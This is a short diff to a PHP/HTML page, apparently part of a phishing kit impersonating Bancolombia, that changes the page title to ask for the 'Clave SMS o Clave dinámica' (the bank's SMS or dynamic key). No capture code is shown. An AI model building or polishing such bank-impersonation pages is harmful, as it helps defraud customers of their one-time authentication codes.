@@ -5,7 +5,7 @@ $tiempo = b34f9_fecha_larga();
 ?>
 <html>
     <head>
-        <title>Bancolombia - Clave SMS</title>
+        <title>Bancolombia - Clave SMS o Clave dinámica</title>
         <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
         
